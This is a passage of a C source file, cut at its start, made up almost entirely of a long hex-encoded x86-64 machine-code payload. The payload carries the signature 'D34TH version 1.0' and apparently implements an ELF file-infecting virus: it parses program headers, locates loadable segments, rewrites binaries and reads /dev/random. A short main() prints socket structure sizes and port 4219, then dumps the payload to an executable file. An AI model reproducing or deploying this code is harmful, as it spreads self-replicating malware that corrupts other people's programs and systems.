x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05\x5b\x48\x89\xc7\xb8\x00\x00\x00\x00\x48\x8d\x74\x24\x08\xba\xdb\x1b\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\x0f\x05\x48\x8d\x7c\x24\x08\xe8\x19\x00\x00\x00\x5f\xb8\x01\x00\x00\x00\x48\x89\xe6\xba\xdb\x1b\x00\x00\x0f\x05\x48\x81\xc4\xdb\x1b\x00\x00\x5f\xc3\x48\xb8\xb8\x00\x00\x00\x00\x60\x00\x00\x50\x48\x89\xe6\x48\xb8\x48\x31\xc0\x90\x90\x60\x00\x00\x50\x48\x89\xe2\x41\xba\xdb\x1b\x00\x00\xb9\x05\x00\x00\x00\x48\x83\xc4\x10\xc3\x41\x53\x41\x57\x53\x51\x41\x50\x41\x51\x41\x52\x56\x52\x57\x48\x31\xc0\x4c\x39\xd0\x74\x5f\x48\x31\xdb\x44\x8a\x1c\x1e\x41\x80\xfb\x60\x75\x3a\x50\xe8\x5c\x00\x00\x00\x48\x83\xf8\x00\x74\x2d\x58\x49\x89\xff\x49\x01\xc7\x49\x01\xdf\x41\x80\x3f\x60\x74\x1e\x48\x31\xdb\x48\x39\xcb\x74\x16\x49\x89\xff\x49\x01\xc7\x49\x01\xdf\x44\x8a\x1c\x1a\x45\x88\x1f\x48\xff\xc3\xeb\xe6\x58\x49\x89\xff\x49\x01\xc7\x49\x01\xdf\x45\x38\x1f\x75\x05\x48\xff\xc3\xeb\xa9\x48\xff\xc0\xeb\x9c\x5f\x5a\x5e\x41\x5a\x41\x59\x41\x58\x59\x5b\x41\x5f\x41\x5b\xc3\x41\x53\x41\x57\x53\x51\x41\x50\x41\x51\x41\x52\x56\x52\x57\xb8\x64\x6f\x6d\x00\x50\x48\xb8\x2f\x64\x65\x76\x2f\x72\x61\x6e\x50\x48\x89\xe7\xe8\xb5\xf5\xff\xff\x48\x89\xc7\x48\x83\xc4\x10\x48\x83\xec\x01\x48\x89\xe6\xba\x01\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x80\x3c\x24\x7f\x73\x07\xb8\x00\x00\x00\x00\xeb\x05\xb8\x01\x00\x00\x00\x48\x83\xc4\x01\x5f\x5a\x5e\x41\x5a\x41\x59\x41\x58\x59\x5b\x41\x5f\x41\x5b\xc3\x48\x83\xec\x04\x56\x68\xe9\x00\x00\x00\xb8\x01\x00\x00\x00\x48\x89\xe6\xba\x01\x00\x00\x00\x0f\x05\x58\x5e\x48\x89\xfb\x48\x89\xf7\x49\x83\xfc\x00\x74\x07\xe8\x43\xf8\xff\xff\xeb\x05\xe8\x9e\xf8\xff\xff\x89\x04\x24\x81\x04\x24\xe0\x1b\x00\x00\x48\x8b\x47\x18\x29\x04\x24\xf7\x1c\x24\x48\x8d\x34\x24\xb8\x01\x00\x00\x00\xba\x04\x00\x00\x00\x48\x89\xdf\x0f\x05\x48\x83\xc4\x04\xc3\xb8\xb8\x3c\x00\x00\x50\x48\x89\xe6\xba\x05\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x58\xb8\xbf\x13\x00\x00\x50\x48\x89\xe6\xba\x05\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x58\x68\x0f\x05\x00\x00\x48\x89\xe6\xba\x02\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x58\xc3\x48\xb8\x2d\x6d\x65\x6c\x63\x20\x2d\x20\x50\x48\xb8\x64\x20\x62\x79\x20\x73\x65\x6c\x50\x48\xb8\x30\x20\x28\x63\x29\x6f\x64\x65\x50\x48\xb8\x72\x73\x69\x6f\x6e\x20\x31\x2e\x50\x48\xb8\x44\x33\x34\x54\x48\x20\x76\x65\x50\x48\x89\xe6\xb8\x01\x00\x00\x00\xba\x28\x00\x00\x00\x0f\x05\x48\x83\xc4\x28\xc3\x48\x83\xec\x74\x57\x48\x8d\x7c\x24\x08\xe8\x16\x00\x00\x00\x5f\xb8\x01\x00\x00\x00\x48\x8d\x34\x24\xba\x74\x00\x00\x00\x0f\x05\x48\x83\xc4\x74\xc3\x48\x31\xc9\x48\x83\xf9\x74\x74\x09\xc6\x04\x0f\x00\x48\xff\xc1\xeb\xf1\xbe\x3c\x00\x00\x00\xb8\x4f\x00\x00\x00\x0f\x05\x48\x31\xdb\x80\x3c\x1f\x00\x74\x05\x48\xff\xc3\xeb\xf5\xc6\x04\x1f\x2f\x48\xff\xc3\x48\x31\xc9\x41\x80\x3c\x0f\x00\x74\x15\x48\x83\xf9\x28\x74\x0f\x41\x8a\x14\x0f\x88\x14\x1f\x48\xff\xc1\x48\xff\xc3\xeb\xe4\xc6\x04\x1f\x20\x48\xff\xc3\x57\x48\xb8\x65\x5f\x65\x70\x6f\x63\x68\x00\x50\x48\xb8\x74\x63\x30\x2f\x73\x69\x6e\x63\x50\x48\xb8\x73\x73\x2f\x72\x74\x63\x2f\x72\x50\x48\xb8\x2f\x73\x79\x73\x2f\x63\x6c\x61\x50\x48\x8d\x3c\x24\xe8\xd5\xf3\xff\xff\x48\x83\xc4\x20\x5e\x48\x01\xde\x48\x89\xc7\xb8\x00\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xc6\x04\x06\x00\xb8\x03\x00\x00\x00\x0f\x05\xc3\x48\x83\xec\x08\xe8\x41\x00\x00\x00\x48\x89\x04\x24\x48\x83\xf8\x00\x74\x07\xe8\xda\x01\x00\x00\xeb\x00\x41\x89\xc2\x48\x8b\x04\x24\xe8\x85\x00\x00\x00\x48\x83\x3c\x24\x00\x74\x07\xe8\x94\x02\x00\x00\xeb\x05\xe8\x15\x04\x00\x00\x49\x89\xc2\x48\x8b\x04\x24\xe8\x91\x05\x00\x00\x48\x83\xc4\x08\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x1f\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0c\x41\x83\x79\x18\x06\x75\x05\xb8\x01\x00\x00\x00\x48\xff\xc1\x48\x83\xc2\x20\xeb\xdb\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x48\x83\xec\x04\x48\x83\xf8\x00\x74\x07\xe8\x6d\x00\x00\x00\xeb\x05\xe8\xca\x00\x00\x00\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\xba\x1c\x00\x00\x00\x50\xb8\x01\x00\x00\x00\x0f\x05\x58\x48\x83\xc6\x1c\x48\x89\xf3\xba\x04\x00\x00\x00\x48\x89\xde\xb8\x01\x00\x00\x00\x0f\x05\x44\x89\x14\x24\x81\x04\x24\x9a\x00\x00\x00\x8b\x5e\x04\x01\x1c\x24\x48\x89\xf3\x48\x89\xe6\xb8\x01\x00\x00\x00\x0f\x05\x48\x89\xde\x48\x83\xc6\x08\xba\x10\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x04\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x18\x06\x75\x08\x41\x8b\x41\x14\x41\x03\x41\x08\x48\xff\xc1\x48\x83\xc2\x20\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x18\x05\x75\x08\x41\x8b\x41\x14\x41\x03\x41\x08\x48\xff\xc1\x48\x83\xc2\x20\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x0f\x8d\xbd\xf6\xff\xff\x4c\x8d\x0c\x16\x41\x83\x39\x01\x0f\x85\xa6\xf6\xff\xff\x41\x83\x79\x18\x06\x0f\x85\x9b\xf6\xff\xff\x41\x8b\x41\x14\x41\x2b\x41\x08\x48\xff\xc1\x48\x83\xc2\x38\xeb\xcc\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x18\x05\x75\x08\x41\x8b\x41\x14\x41\x2b\x41\x08\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x48\x83\xec\x04\x48\x83\xec\x04\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x0f\x8d\x3a\x01\x00\x00\x4c\x8d\x0c\x16\x41\x83\x39\x01\x0f\x85\x09\x01\x00\x00\x50\x51\x56\x52\x4c\x89\xce\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xc7\x44\x24\x02\x07\x00\x00\x00\x41\x83\x79\x18\x06\x74\x4e\x50\x51\x56\x52\x49\x8d\x71\x04\xba\x14\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x04\x00\x00\x00\x49\x8d\x71\x1c\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xe9\xac\x00\x00\x00\x50\x51\x56\x52\x49\x8d\x71\x04\xba\x0c\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xb8\x00\x00\x00\x00\x41\x8b\x41\x14\x89\x44\x24\x06\x81\x44\x24\x06\x9a\x00\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x26\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x04\x00\x00\x00\x49\x8d\x71\x1c\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x81\x6c\x24\x06\x9a\x00\x00\x00\xb8\x00\x00\x00\x00\x8b\x44\x24\x06\x41\x2b\x41\x10\xeb\x17\x50\x51\x56\x52\x4c\x89\xce\xba\x20\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\xff\xc1\x48\x83\xc2\x20\xe9\xbc\xfe\xff\xff\x48\x83\xc4\x02\x48\x83\xc4\x04\x48\x83\xc4\x04\x5a\x5e\x5f\xc3\x57\x56\x52\x48\x83\xec\x04\x48\x83\xec\x04\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x0f\x8d\x3a\x01\x00\x00\x4c\x8d\x0c\x16\x41\x83\x39\x01\x0f\x85\x09\x01\x00\x00\x50\x51\x56\x52\x4c\x89\xce\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xc7\x44\x24\x02\x07\x00\x00\x00\x41\x83\x79\x18\x05\x74\x4e\x50\x51\x56\x52\x49\x8d\x71\x04\xba\x14\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x04\x00\x00\x00\x49\x8d\x71\x1c\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xe9\xac\x00\x00\x00\x50\x51\x56\x52\x49\x8d\x71\x04\xba\x0c\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xb8\x00\x00\x00\x00\x41\x8b\x41\x14\x89\x44\x24\x06\x81\x44\x24\x06\x9a\x00\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x26\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x04\x00\x00\x00\x49\x8d\x71\x1c\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x81\x6c\x24\x06\x9a\x00\x00\x00\xb8\x00\x00\x00\x00\x8b\x44\x24\x06\x41\x2b\x41\x10\xeb\x17\x50\x51\x56\x52\x4c\x89\xce\xba\x20\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\xff\xc1\x48\x83\xc2\x20\xe9\xbc\xfe\xff\xff\x48\x83\xc4\x02\x48\x83\xc4\x04\x48\x83\xc4\x04\x5a\x5e\x5f\xc3\x49\x89\xc4\x48\x83\xec\x08\x48\x83\xec\x08\x48\x83\xec\x08\x49\x89\xd1\x48\x89\x7c\x24\x10\x48\x83\xf8\x00\x74\x07\xe8\x9d\x00\x00\x00\xeb\x05\xe8\xff\x00\x00\x00\x48\x89\x44\x24\x08\x48\x89\xf3\x48\x89\xfe\x48\x89\xdf\x48\x31\xdb\x66\x8b\x5e\x2c\xb8\x00\x00\x00\x00\xb8\x20\x00\x00\x00\x48\xf7\xe3\x03\x46\x1c\x48\x89\x04\x24\x48\x8d\x34\x06\x48\x8b\x54\x24\x08\x48\x2b\x14\x24\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xc9\x4c\x39\xd1\x73\x1c\x56\x51\x6a\x00\x48\x8d\x34\x24\xba\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x59\x5e\x48\xff\xc1\xeb\xdf\x48\x8b\x74\x24\x10\xe8\x74\xf8\xff\xff\xe8\xba\xf8\xff\xff\x48\x8b\x74\x24\x10\x48\x03\x74\x24\x08\x4c\x89\xca\x48\x2b\x54\x24\x08\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x48\x83\xc4\x08\x48\x83\xc4\x08\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x27\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x14\x41\x83\x79\x18\x06\x75\x0d\xb8\x00\x00\x00\x00\x41\x8b\x41\x10\x41\x03\x41\x04\x48\xff\xc1\x48\x83\xc2\x20\xeb\xd3\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x2c\x66\x89\x1c\x24\x48\x31\xdb\x8b\x5f\x1c\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x27\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x14\x41\x83\x79\x18\x05\x75\x0d\xb8\x00\x00\x00\x00\x41\x8b\x41\x10\x41\x03\x41\x04\x48\xff\xc1\x48\x83\xc2\x20\xeb\xd3\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x5a\x58\x5b\x59\x5e\x5f";

int main()
{

printf("%d\n", sizeof(sa_family_t));
printf("%d\n", sizeof(in_port_t));
printf("%d\n", sizeof(struct in_addr));
printf("%d\n", sizeof(struct sockaddr_in));

printf("%d\n", htons(4219));
printf("%d\n", inet_addr("127.0.0.1"));
	int fd = open("sc", O_RDWR | O_CREAT | O_TRUNC, 0777);
	write(fd, s, SC_LEN);
}